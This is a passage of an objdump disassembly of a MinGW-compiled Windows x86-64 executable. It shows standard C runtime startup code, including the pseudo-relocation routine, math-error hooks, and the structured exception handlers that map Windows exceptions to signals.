  401d6a:	e9 43 ff ff ff       	jmp    401cb2 <_pei386_runtime_relocator+0x22>
  401d6f:	90                   	nop
  401d70:	44 0f b6 01          	movzbl (%rcx),%r8d
  401d74:	4c 89 ff             	mov    %r15,%rdi
  401d77:	4d 89 c2             	mov    %r8,%r10
  401d7a:	49 81 ca 00 ff ff ff 	or     $0xffffffffffffff00,%r10
  401d81:	45 84 c0             	test   %r8b,%r8b
  401d84:	4d 0f 48 c2          	cmovs  %r10,%r8
  401d88:	49 29 d0             	sub    %rdx,%r8
  401d8b:	4c 89 fa             	mov    %r15,%rdx
  401d8e:	4d 01 c8             	add    %r9,%r8
  401d91:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
  401d95:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  401d9b:	e8 e0 fc ff ff       	call   401a80 <_fpreset+0x80>
  401da0:	48 83 c3 0c          	add    $0xc,%rbx
  401da4:	4c 39 e3             	cmp    %r12,%rbx
  401da7:	73 77                	jae    401e20 <_pei386_runtime_relocator+0x190>
  401da9:	8b 13                	mov    (%rbx),%edx
  401dab:	8b 4b 04             	mov    0x4(%rbx),%ecx
  401dae:	44 0f b6 43 08       	movzbl 0x8(%rbx),%r8d
  401db3:	4c 01 ea             	add    %r13,%rdx
  401db6:	4c 01 e9             	add    %r13,%rcx
  401db9:	4c 8b 0a             	mov    (%rdx),%r9
  401dbc:	41 83 f8 20          	cmp    $0x20,%r8d
  401dc0:	0f 84 0a 01 00 00    	je     401ed0 <_pei386_runtime_relocator+0x240>
  401dc6:	0f 87 d4 00 00 00    	ja     401ea0 <_pei386_runtime_relocator+0x210>
  401dcc:	41 83 f8 08          	cmp    $0x8,%r8d
  401dd0:	74 9e                	je     401d70 <_pei386_runtime_relocator+0xe0>
  401dd2:	41 83 f8 10          	cmp    $0x10,%r8d
  401dd6:	0f 85 75 01 00 00    	jne    401f51 <_pei386_runtime_relocator+0x2c1>
  401ddc:	44 0f b7 01          	movzwl (%rcx),%r8d
  401de0:	4c 89 ff             	mov    %r15,%rdi
  401de3:	4d 89 c2             	mov    %r8,%r10
  401de6:	49 81 ca 00 00 ff ff 	or     $0xffffffffffff0000,%r10
  401ded:	66 45 85 c0          	test   %r8w,%r8w
  401df1:	4d 0f 48 c2          	cmovs  %r10,%r8
  401df5:	48 83 c3 0c          	add    $0xc,%rbx
  401df9:	49 29 d0             	sub    %rdx,%r8
  401dfc:	4c 89 fa             	mov    %r15,%rdx
  401dff:	4d 01 c8             	add    %r9,%r8
  401e02:	4c 89 45 a8          	mov    %r8,-0x58(%rbp)
  401e06:	41 b8 02 00 00 00    	mov    $0x2,%r8d
  401e0c:	e8 6f fc ff ff       	call   401a80 <_fpreset+0x80>
  401e11:	4c 39 e3             	cmp    %r12,%rbx
  401e14:	72 93                	jb     401da9 <_pei386_runtime_relocator+0x119>
  401e16:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  401e1d:	00 00 00 
  401e20:	8b 05 ee 67 00 00    	mov    0x67ee(%rip),%eax        # 408614 <mingw_app_type+0x14>
  401e26:	85 c0                	test   %eax,%eax
  401e28:	0f 8e 84 fe ff ff    	jle    401cb2 <_pei386_runtime_relocator+0x22>
  401e2e:	4c 8b 25 3f 76 00 00 	mov    0x763f(%rip),%r12        # 409474 <__imp_VirtualProtect>
  401e35:	31 db                	xor    %ebx,%ebx
  401e37:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  401e3e:	00 00 
  401e40:	48 8b 05 d1 67 00 00 	mov    0x67d1(%rip),%rax        # 408618 <mingw_app_type+0x18>
  401e47:	48 01 d8             	add    %rbx,%rax
  401e4a:	44 8b 00             	mov    (%rax),%r8d
  401e4d:	45 85 c0             	test   %r8d,%r8d
  401e50:	74 0e                	je     401e60 <_pei386_runtime_relocator+0x1d0>
  401e52:	48 8b 50 10          	mov    0x10(%rax),%rdx
  401e56:	48 8b 48 08          	mov    0x8(%rax),%rcx
  401e5a:	49 89 f9             	mov    %rdi,%r9
  401e5d:	41 ff d4             	call   *%r12
  401e60:	83 c6 01             	add    $0x1,%esi
  401e63:	48 83 c3 28          	add    $0x28,%rbx
  401e67:	3b 35 a7 67 00 00    	cmp    0x67a7(%rip),%esi        # 408614 <mingw_app_type+0x14>
  401e6d:	7c d1                	jl     401e40 <_pei386_runtime_relocator+0x1b0>
  401e6f:	e9 3e fe ff ff       	jmp    401cb2 <_pei386_runtime_relocator+0x22>
  401e74:	0f 1f 40 00          	nopl   0x0(%rax)
  401e78:	85 d2                	test   %edx,%edx
  401e7a:	0f 85 80 00 00 00    	jne    401f00 <_pei386_runtime_relocator+0x270>
  401e80:	8b 43 04             	mov    0x4(%rbx),%eax
  401e83:	89 c7                	mov    %eax,%edi
  401e85:	0b 7b 08             	or     0x8(%rbx),%edi
  401e88:	0f 85 aa fe ff ff    	jne    401d38 <_pei386_runtime_relocator+0xa8>
  401e8e:	8b 53 0c             	mov    0xc(%rbx),%edx
  401e91:	48 83 c3 0c          	add    $0xc,%rbx
  401e95:	e9 93 fe ff ff       	jmp    401d2d <_pei386_runtime_relocator+0x9d>
  401e9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  401ea0:	41 83 f8 40          	cmp    $0x40,%r8d
  401ea4:	0f 85 a7 00 00 00    	jne    401f51 <_pei386_runtime_relocator+0x2c1>
  401eaa:	48 8b 01             	mov    (%rcx),%rax
  401ead:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  401eb3:	4c 89 ff             	mov    %r15,%rdi
  401eb6:	48 29 d0             	sub    %rdx,%rax
  401eb9:	4c 89 fa             	mov    %r15,%rdx
  401ebc:	4c 01 c8             	add    %r9,%rax
  401ebf:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  401ec3:	e8 b8 fb ff ff       	call   401a80 <_fpreset+0x80>
  401ec8:	e9 d3 fe ff ff       	jmp    401da0 <_pei386_runtime_relocator+0x110>
  401ecd:	0f 1f 00             	nopl   (%rax)
  401ed0:	8b 01                	mov    (%rcx),%eax
  401ed2:	4c 89 ff             	mov    %r15,%rdi
  401ed5:	49 89 c0             	mov    %rax,%r8
  401ed8:	4c 09 f0             	or     %r14,%rax
  401edb:	45 85 c0             	test   %r8d,%r8d
  401ede:	49 0f 49 c0          	cmovns %r8,%rax
  401ee2:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  401ee8:	48 29 d0             	sub    %rdx,%rax
  401eeb:	4c 89 fa             	mov    %r15,%rdx
  401eee:	4c 01 c8             	add    %r9,%rax
  401ef1:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  401ef5:	e8 86 fb ff ff       	call   401a80 <_fpreset+0x80>
  401efa:	e9 a1 fe ff ff       	jmp    401da0 <_pei386_runtime_relocator+0x110>
  401eff:	90                   	nop
  401f00:	4c 39 e3             	cmp    %r12,%rbx
  401f03:	0f 83 a9 fd ff ff    	jae    401cb2 <_pei386_runtime_relocator+0x22>
  401f09:	49 83 ec 01          	sub    $0x1,%r12
  401f0d:	4c 8b 2d 2c 35 00 00 	mov    0x352c(%rip),%r13        # 405440 <.refptr.__image_base__>
  401f14:	48 8d 7d a8          	lea    -0x58(%rbp),%rdi
  401f18:	49 29 dc             	sub    %rbx,%r12
  401f1b:	49 c1 ec 03          	shr    $0x3,%r12
  401f1f:	4e 8d 64 e3 08       	lea    0x8(%rbx,%r12,8),%r12
  401f24:	0f 1f 40 00          	nopl   0x0(%rax)
  401f28:	8b 4b 04             	mov    0x4(%rbx),%ecx
  401f2b:	8b 03                	mov    (%rbx),%eax
  401f2d:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  401f33:	48 89 fa             	mov    %rdi,%rdx
  401f36:	48 83 c3 08          	add    $0x8,%rbx
  401f3a:	4c 01 e9             	add    %r13,%rcx
  401f3d:	03 01                	add    (%rcx),%eax
  401f3f:	89 45 a8             	mov    %eax,-0x58(%rbp)
  401f42:	e8 39 fb ff ff       	call   401a80 <_fpreset+0x80>
  401f47:	4c 39 e3             	cmp    %r12,%rbx
  401f4a:	75 dc                	jne    401f28 <_pei386_runtime_relocator+0x298>
  401f4c:	e9 cf fe ff ff       	jmp    401e20 <_pei386_runtime_relocator+0x190>
  401f51:	44 89 c2             	mov    %r8d,%edx
  401f54:	48 8d 0d bd 33 00 00 	lea    0x33bd(%rip),%rcx        # 405318 <_tls_used+0x258>
  401f5b:	48 c7 45 a8 00 00 00 	movq   $0x0,-0x58(%rbp)
  401f62:	00 
  401f63:	e8 a8 fa ff ff       	call   401a10 <_fpreset+0x10>
  401f68:	48 8d 0d 71 33 00 00 	lea    0x3371(%rip),%rcx        # 4052e0 <_tls_used+0x220>
  401f6f:	e8 9c fa ff ff       	call   401a10 <_fpreset+0x10>
  401f74:	90                   	nop
  401f75:	90                   	nop
  401f76:	90                   	nop
  401f77:	90                   	nop
  401f78:	90                   	nop
  401f79:	90                   	nop
  401f7a:	90                   	nop
  401f7b:	90                   	nop
  401f7c:	90                   	nop
  401f7d:	90                   	nop
  401f7e:	90                   	nop
  401f7f:	90                   	nop

0000000000401f80 <__mingw_raise_matherr>:
  401f80:	48 83 ec 58          	sub    $0x58,%rsp
  401f84:	48 8b 05 95 66 00 00 	mov    0x6695(%rip),%rax        # 408620 <mingw_app_type+0x20>
  401f8b:	48 85 c0             	test   %rax,%rax
  401f8e:	74 2c                	je     401fbc <__mingw_raise_matherr+0x3c>
  401f90:	f2 0f 10 84 24 80 00 	movsd  0x80(%rsp),%xmm0
  401f97:	00 00 
  401f99:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
  401f9d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
  401fa2:	48 89 54 24 28       	mov    %rdx,0x28(%rsp)
  401fa7:	f2 0f 11 54 24 30    	movsd  %xmm2,0x30(%rsp)
  401fad:	f2 0f 11 5c 24 38    	movsd  %xmm3,0x38(%rsp)
  401fb3:	f2 0f 11 44 24 40    	movsd  %xmm0,0x40(%rsp)
  401fb9:	ff d0                	call   *%rax
  401fbb:	90                   	nop
  401fbc:	48 83 c4 58          	add    $0x58,%rsp
  401fc0:	c3                   	ret
  401fc1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
  401fc8:	00 00 00 00 
  401fcc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401fd0 <__mingw_setusermatherr>:
  401fd0:	48 89 0d 49 66 00 00 	mov    %rcx,0x6649(%rip)        # 408620 <mingw_app_type+0x20>
  401fd7:	e9 34 12 00 00       	jmp    403210 <__setusermatherr>
  401fdc:	90                   	nop
  401fdd:	90                   	nop
  401fde:	90                   	nop
  401fdf:	90                   	nop

0000000000401fe0 <__mingw_SEH_error_handler>:
  401fe0:	48 83 ec 28          	sub    $0x28,%rsp
  401fe4:	8b 01                	mov    (%rcx),%eax
  401fe6:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  401feb:	0f 87 2f 01 00 00    	ja     402120 <__mingw_SEH_error_handler+0x140>
  401ff1:	3d 8b 00 00 c0       	cmp    $0xc000008b,%eax
  401ff6:	76 58                	jbe    402050 <__mingw_SEH_error_handler+0x70>
  401ff8:	05 73 ff ff 3f       	add    $0x3fffff73,%eax
  401ffd:	83 f8 09             	cmp    $0x9,%eax
  402000:	77 3a                	ja     40203c <__mingw_SEH_error_handler+0x5c>
  402002:	48 8d 15 47 33 00 00 	lea    0x3347(%rip),%rdx        # 405350 <_tls_used+0x290>
  402009:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
  40200d:	48 01 d0             	add    %rdx,%rax
  402010:	ff e0                	jmp    *%rax
  402012:	31 d2                	xor    %edx,%edx
  402014:	b9 08 00 00 00       	mov    $0x8,%ecx
  402019:	e8 da 11 00 00       	call   4031f8 <signal>
  40201e:	48 83 f8 01          	cmp    $0x1,%rax
  402022:	0f 85 a5 00 00 00    	jne    4020cd <__mingw_SEH_error_handler+0xed>
  402028:	ba 01 00 00 00       	mov    $0x1,%edx
  40202d:	b9 08 00 00 00       	mov    $0x8,%ecx
  402032:	e8 c1 11 00 00       	call   4031f8 <signal>
  402037:	e8 c4 f9 ff ff       	call   401a00 <_fpreset>
  40203c:	45 31 c0             	xor    %r8d,%r8d
  40203f:	44 89 c0             	mov    %r8d,%eax
  402042:	48 83 c4 28          	add    $0x28,%rsp
  402046:	c3                   	ret
  402047:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40204e:	00 00 
  402050:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  402055:	0f 84 95 00 00 00    	je     4020f0 <__mingw_SEH_error_handler+0x110>
  40205b:	76 46                	jbe    4020a3 <__mingw_SEH_error_handler+0xc3>
  40205d:	45 31 c0             	xor    %r8d,%r8d
  402060:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  402065:	74 d8                	je     40203f <__mingw_SEH_error_handler+0x5f>
  402067:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  40206c:	0f 85 ae 00 00 00    	jne    402120 <__mingw_SEH_error_handler+0x140>
  402072:	31 d2                	xor    %edx,%edx
  402074:	b9 04 00 00 00       	mov    $0x4,%ecx
  402079:	e8 7a 11 00 00       	call   4031f8 <signal>
  40207e:	48 83 f8 01          	cmp    $0x1,%rax
  402082:	0f 84 b8 00 00 00    	je     402140 <__mingw_SEH_error_handler+0x160>
  402088:	48 85 c0             	test   %rax,%rax
  40208b:	0f 84 9f 00 00 00    	je     402130 <__mingw_SEH_error_handler+0x150>
  402091:	b9 04 00 00 00       	mov    $0x4,%ecx
  402096:	ff d0                	call   *%rax
  402098:	45 31 c0             	xor    %r8d,%r8d
  40209b:	44 89 c0             	mov    %r8d,%eax
  40209e:	48 83 c4 28          	add    $0x28,%rsp
  4020a2:	c3                   	ret
  4020a3:	45 31 c0             	xor    %r8d,%r8d
  4020a6:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  4020ab:	41 0f 95 c0          	setne  %r8b
  4020af:	44 89 c0             	mov    %r8d,%eax
  4020b2:	48 83 c4 28          	add    $0x28,%rsp
  4020b6:	c3                   	ret
  4020b7:	31 d2                	xor    %edx,%edx
  4020b9:	b9 08 00 00 00       	mov    $0x8,%ecx
  4020be:	e8 35 11 00 00       	call   4031f8 <signal>
  4020c3:	48 83 f8 01          	cmp    $0x1,%rax
  4020c7:	0f 84 93 00 00 00    	je     402160 <__mingw_SEH_error_handler+0x180>
  4020cd:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  4020d3:	48 85 c0             	test   %rax,%rax
  4020d6:	0f 84 63 ff ff ff    	je     40203f <__mingw_SEH_error_handler+0x5f>
  4020dc:	b9 08 00 00 00       	mov    $0x8,%ecx
  4020e1:	ff d0                	call   *%rax
  4020e3:	45 31 c0             	xor    %r8d,%r8d
  4020e6:	e9 54 ff ff ff       	jmp    40203f <__mingw_SEH_error_handler+0x5f>
  4020eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4020f0:	31 d2                	xor    %edx,%edx
  4020f2:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4020f7:	e8 fc 10 00 00       	call   4031f8 <signal>
  4020fc:	48 83 f8 01          	cmp    $0x1,%rax
  402100:	74 7e                	je     402180 <__mingw_SEH_error_handler+0x1a0>
  402102:	48 85 c0             	test   %rax,%rax
  402105:	74 29                	je     402130 <__mingw_SEH_error_handler+0x150>
  402107:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40210c:	ff d0                	call   *%rax
  40210e:	45 31 c0             	xor    %r8d,%r8d
  402111:	e9 29 ff ff ff       	jmp    40203f <__mingw_SEH_error_handler+0x5f>
  402116:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40211d:	00 00 00 
  402120:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  402126:	e9 14 ff ff ff       	jmp    40203f <__mingw_SEH_error_handler+0x5f>
  40212b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402130:	41 b8 04 00 00 00    	mov    $0x4,%r8d
  402136:	e9 04 ff ff ff       	jmp    40203f <__mingw_SEH_error_handler+0x5f>
  40213b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  402140:	ba 01 00 00 00       	mov    $0x1,%edx
  402145:	b9 04 00 00 00       	mov    $0x4,%ecx
  40214a:	e8 a9 10 00 00       	call   4031f8 <signal>
  40214f:	45 31 c0             	xor    %r8d,%r8d
  402152:	e9 e8 fe ff ff       	jmp    40203f <__mingw_SEH_error_handler+0x5f>
  402157:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40215e:	00 00 
  402160:	ba 01 00 00 00       	mov    $0x1,%edx
  402165:	b9 08 00 00 00       	mov    $0x8,%ecx
  40216a:	e8 89 10 00 00       	call   4031f8 <signal>
  40216f:	45 31 c0             	xor    %r8d,%r8d
  402172:	e9 c8 fe ff ff       	jmp    40203f <__mingw_SEH_error_handler+0x5f>
  402177:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40217e:	00 00 
  402180:	ba 01 00 00 00       	mov    $0x1,%edx
  402185:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40218a:	e8 69 10 00 00       	call   4031f8 <signal>
  40218f:	45 31 c0             	xor    %r8d,%r8d
  402192:	e9 a8 fe ff ff       	jmp    40203f <__mingw_SEH_error_handler+0x5f>
  402197:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40219e:	00 00 

00000000004021a0 <__mingw_init_ehandler>:
  4021a0:	41 54                	push   %r12
  4021a2:	55                   	push   %rbp
  4021a3:	57                   	push   %rdi
  4021a4:	56                   	push   %rsi
  4021a5:	53                   	push   %rbx
  4021a6:	48 83 ec 20          	sub    $0x20,%rsp
  4021aa:	e8 61 07 00 00       	call   402910 <_GetPEImageBase>
  4021af:	48 89 c6             	mov    %rax,%rsi
  4021b2:	8b 05 90 64 00 00    	mov    0x6490(%rip),%eax        # 408648 <__mingw_oldexcpt_handler+0x8>
  4021b8:	85 c0                	test   %eax,%eax
  4021ba:	75 25                	jne    4021e1 <__mingw_init_ehandler+0x41>
  4021bc:	48 85 f6             	test   %rsi,%rsi
  4021bf:	74 20                	je     4021e1 <__mingw_init_ehandler+0x41>
  4021c1:	48 8d 0d b0 31 00 00 	lea    0x31b0(%rip),%rcx        # 405378 <_tls_used+0x2b8>
  4021c8:	c7 05 76 64 00 00 01 	movl   $0x1,0x6476(%rip)        # 408648 <__mingw_oldexcpt_handler+0x8>
  4021cf:	00 00 00 
  4021d2:	e8 69 05 00 00       	call   402740 <_FindPESectionByName>
  4021d7:	48 85 c0             	test   %rax,%rax
  4021da:	74 14                	je     4021f0 <__mingw_init_ehandler+0x50>
  4021dc:	b8 01 00 00 00       	mov    $0x1,%eax
  4021e1:	48 83 c4 20          	add    $0x20,%rsp
  4021e5:	5b                   	pop    %rbx
  4021e6:	5e                   	pop    %rsi
  4021e7:	5f                   	pop    %rdi
  4021e8:	5d                   	pop    %rbp
  4021e9:	41 5c                	pop    %r12
  4021eb:	c3                   	ret
  4021ec:	0f 1f 40 00          	nopl   0x0(%rax)
  4021f0:	48 8d 1d 69 65 00 00 	lea    0x6569(%rip),%rbx        # 408760 <__mingw_oldexcpt_handler+0x120>
  4021f7:	b9 30 00 00 00       	mov    $0x30,%ecx
  4021fc:	45 31 e4             	xor    %r12d,%r12d
  4021ff:	48 8d 15 5a 64 00 00 	lea    0x645a(%rip),%rdx        # 408660 <__mingw_oldexcpt_handler+0x20>
  402206:	48 89 df             	mov    %rbx,%rdi
  402209:	48 8d 2d d0 fd ff ff 	lea    -0x230(%rip),%rbp        # 401fe0 <__mingw_SEH_error_handler>
  402210:	f3 48 ab             	rep stos %rax,(%rdi)
  402213:	b9 20 00 00 00       	mov    $0x20,%ecx
  402218:	48 89 d7             	mov    %rdx,%rdi
  40221b:	48 29 f5             	sub    %rsi,%rbp
  40221e:	f3 48 ab             	rep stos %rax,(%rdi)
  402221:	48 89 d7             	mov    %rdx,%rdi
  402224:	eb 37                	jmp    40225d <__mingw_init_ehandler+0xbd>
  402226:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
  40222d:	00 00 00 
  402230:	c6 07 09             	movb   $0x9,(%rdi)
  402233:	49 83 c4 01          	add    $0x1,%r12
  402237:	48 83 c3 0c          	add    $0xc,%rbx
  40223b:	89 6f 04             	mov    %ebp,0x4(%rdi)
  40223e:	8b 50 0c             	mov    0xc(%rax),%edx
  402241:	89 53 f4             	mov    %edx,-0xc(%rbx)
  402244:	03 50 08             	add    0x8(%rax),%edx
  402247:	48 89 f8             	mov    %rdi,%rax
  40224a:	48 83 c7 08          	add    $0x8,%rdi
  40224e:	48 29 f0             	sub    %rsi,%rax
  402251:	89 53 f8             	mov    %edx,-0x8(%rbx)
  402254:	89 43 fc             	mov    %eax,-0x4(%rbx)
  402257:	49 83 fc 20          	cmp    $0x20,%r12
  40225b:	74 23                	je     402280 <__mingw_init_ehandler+0xe0>
  40225d:	4c 89 e1             	mov    %r12,%rcx
  402260:	e8 3b 06 00 00       	call   4028a0 <_FindPESectionExec>
  402265:	48 85 c0             	test   %rax,%rax
  402268:	75 c6                	jne    402230 <__mingw_init_ehandler+0x90>
  40226a:	4d 85 e4             	test   %r12,%r12
  40226d:	0f 84 69 ff ff ff    	je     4021dc <__mingw_init_ehandler+0x3c>
  402273:	44 89 e2             	mov    %r12d,%edx
  402276:	eb 0d                	jmp    402285 <__mingw_init_ehandler+0xe5>
  402278:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40227f:	00 
  402280:	ba 20 00 00 00       	mov    $0x20,%edx
  402285:	49 89 f0             	mov    %rsi,%r8
  402288:	48 8d 0d d1 64 00 00 	lea    0x64d1(%rip),%rcx        # 408760 <__mingw_oldexcpt_handler+0x120>
  40228f:	ff 15 7f 71 00 00    	call   *0x717f(%rip)        # 409414 <__imp_RtlAddFunctionTable>
  402295:	e9 42 ff ff ff       	jmp    4021dc <__mingw_init_ehandler+0x3c>
  40229a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000000004022a0 <_gnu_exception_handler>:
  4022a0:	41 54                	push   %r12
  4022a2:	48 83 ec 20          	sub    $0x20,%rsp
  4022a6:	48 8b 11             	mov    (%rcx),%rdx
  4022a9:	8b 02                	mov    (%rdx),%eax
  4022ab:	49 89 cc             	mov    %rcx,%r12
  4022ae:	89 c1                	mov    %eax,%ecx
  4022b0:	81 e1 ff ff ff 20    	and    $0x20ffffff,%ecx
  4022b6:	81 f9 43 43 47 20    	cmp    $0x20474343,%ecx
  4022bc:	0f 84 ce 00 00 00    	je     402390 <_gnu_exception_handler+0xf0>
  4022c2:	3d 96 00 00 c0       	cmp    $0xc0000096,%eax
  4022c7:	0f 87 aa 00 00 00    	ja     402377 <_gnu_exception_handler+0xd7>
  4022cd:	3d 8b 00 00 c0       	cmp    $0xc000008b,%eax
  4022d2:	76 54                	jbe    402328 <_gnu_exception_handler+0x88>
  4022d4:	05 73 ff ff 3f       	add    $0x3fffff73,%eax
  4022d9:	83 f8 09             	cmp    $0x9,%eax
  4022dc:	77 3a                	ja     402318 <_gnu_exception_handler+0x78>
  4022de:	48 8d 15 9b 30 00 00 	lea    0x309b(%rip),%rdx        # 405380 <_tls_used+0x2c0>
  4022e5:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
  4022e9:	48 01 d0             	add    %rdx,%rax
  4022ec:	ff e0                	jmp    *%rax
  4022ee:	31 d2                	xor    %edx,%edx
  4022f0:	b9 08 00 00 00       	mov    $0x8,%ecx
  4022f5:	e8 fe 0e 00 00       	call   4031f8 <signal>
  4022fa:	48 83 f8 01          	cmp    $0x1,%rax
  4022fe:	0f 85 b7 00 00 00    	jne    4023bb <_gnu_exception_handler+0x11b>
  402304:	ba 01 00 00 00       	mov    $0x1,%edx
  402309:	b9 08 00 00 00       	mov    $0x8,%ecx
  40230e:	e8 e5 0e 00 00       	call   4031f8 <signal>
  402313:	e8 e8 f6 ff ff       	call   401a00 <_fpreset>
  402318:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40231d:	48 83 c4 20          	add    $0x20,%rsp
  402321:	41 5c                	pop    %r12
  402323:	c3                   	ret
  402324:	0f 1f 40 00          	nopl   0x0(%rax)
  402328:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  40232d:	0f 84 a5 00 00 00    	je     4023d8 <_gnu_exception_handler+0x138>
  402333:	76 3b                	jbe    402370 <_gnu_exception_handler+0xd0>
  402335:	3d 08 00 00 c0       	cmp    $0xc0000008,%eax
  40233a:	74 dc                	je     402318 <_gnu_exception_handler+0x78>
  40233c:	3d 1d 00 00 c0       	cmp    $0xc000001d,%eax
  402341:	75 34                	jne    402377 <_gnu_exception_handler+0xd7>
  402343:	31 d2                	xor    %edx,%edx
  402345:	b9 04 00 00 00       	mov    $0x4,%ecx
  40234a:	e8 a9 0e 00 00       	call   4031f8 <signal>
  40234f:	48 83 f8 01          	cmp    $0x1,%rax
  402353:	0f 84 a7 00 00 00    	je     402400 <_gnu_exception_handler+0x160>
  402359:	48 85 c0             	test   %rax,%rax
  40235c:	74 19                	je     402377 <_gnu_exception_handler+0xd7>
  40235e:	b9 04 00 00 00       	mov    $0x4,%ecx
  402363:	ff d0                	call   *%rax
  402365:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  40236a:	eb b1                	jmp    40231d <_gnu_exception_handler+0x7d>
  40236c:	0f 1f 40 00          	nopl   0x0(%rax)
  402370:	3d 02 00 00 80       	cmp    $0x80000002,%eax
  402375:	74 a1                	je     402318 <_gnu_exception_handler+0x78>
  402377:	48 8b 05 c2 62 00 00 	mov    0x62c2(%rip),%rax        # 408640 <__mingw_oldexcpt_handler>
  40237e:	48 85 c0             	test   %rax,%rax
  402381:	74 1d                	je     4023a0 <_gnu_exception_handler+0x100>
  402383:	4c 89 e1             	mov    %r12,%rcx
  402386:	48 83 c4 20          	add    $0x20,%rsp
  40238a:	41 5c                	pop    %r12
  40238c:	48 ff e0             	rex.W jmp *%rax
  40238f:	90                   	nop
  402390:	f6 42 04 01          	testb  $0x1,0x4(%rdx)
  402394:	0f 85 28 ff ff ff    	jne    4022c2 <_gnu_exception_handler+0x22>
  40239a:	e9 79 ff ff ff       	jmp    402318 <_gnu_exception_handler+0x78>
  40239f:	90                   	nop
  4023a0:	31 c0                	xor    %eax,%eax
  4023a2:	48 83 c4 20          	add    $0x20,%rsp
  4023a6:	41 5c                	pop    %r12
  4023a8:	c3                   	ret
  4023a9:	31 d2                	xor    %edx,%edx
  4023ab:	b9 08 00 00 00       	mov    $0x8,%ecx
  4023b0:	e8 43 0e 00 00       	call   4031f8 <signal>
  4023b5:	48 83 f8 01          	cmp    $0x1,%rax
  4023b9:	74 65                	je     402420 <_gnu_exception_handler+0x180>
  4023bb:	48 85 c0             	test   %rax,%rax
  4023be:	74 b7                	je     402377 <_gnu_exception_handler+0xd7>
  4023c0:	b9 08 00 00 00       	mov    $0x8,%ecx
  4023c5:	ff d0                	call   *%rax
  4023c7:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4023cc:	e9 4c ff ff ff       	jmp    40231d <_gnu_exception_handler+0x7d>
  4023d1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  4023d8:	31 d2                	xor    %edx,%edx
  4023da:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4023df:	e8 14 0e 00 00       	call   4031f8 <signal>
  4023e4:	48 83 f8 01          	cmp    $0x1,%rax
  4023e8:	74 4f                	je     402439 <_gnu_exception_handler+0x199>
  4023ea:	48 85 c0             	test   %rax,%rax
  4023ed:	74 88                	je     402377 <_gnu_exception_handler+0xd7>
  4023ef:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4023f4:	ff d0                	call   *%rax
  4023f6:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4023fb:	e9 1d ff ff ff       	jmp    40231d <_gnu_exception_handler+0x7d>
  402400:	ba 01 00 00 00       	mov    $0x1,%edx
  402405:	b9 04 00 00 00       	mov    $0x4,%ecx
  40240a:	e8 e9 0d 00 00       	call   4031f8 <signal>
  40240f:	83 c8 ff             	or     $0xffffffff,%eax
  402412:	e9 06 ff ff ff       	jmp    40231d <_gnu_exception_handler+0x7d>
  402417:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40241e:	00 00 
  402420:	ba 01 00 00 00       	mov    $0x1,%edx
  402425:	b9 08 00 00 00       	mov    $0x8,%ecx
  40242a:	e8 c9 0d 00 00       	call   4031f8 <signal>
  40242f:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  402434:	e9 e4 fe ff ff       	jmp    40231d <_gnu_exception_handler+0x7d>
  402439:	ba 01 00 00 00       	mov    $0x1,%edx
  40243e:	b9 0b 00 00 00       	mov    $0xb,%ecx
  402443:	e8 b0 0d 00 00       	call   4031f8 <signal>
  402448:	83 c8 ff             	or     $0xffffffff,%eax
  40244b:	e9 cd fe ff ff       	jmp    40231d <_gnu_exception_handler+0x7d>
  402450:	41 54                	push   %r12
  402452:	57                   	push   %rdi
  402453:	56                   	push   %rsi
  402454:	53                   	push   %rbx
  402455:	48 83 ec 28          	sub    $0x28,%rsp
  402459:	48 8d 0d a0 64 00 00 	lea    0x64a0(%rip),%rcx        # 408900 <__mingw_oldexcpt_handler+0x2c0>
  402460:	ff 15 46 6f 00 00    	call   *0x6f46(%rip)        # 4093ac <__imp_EnterCriticalSection>
  402466:	48 8b 1d 73 64 00 00 	mov    0x6473(%rip),%rbx        # 4088e0 <__mingw_oldexcpt_handler+0x2a0>
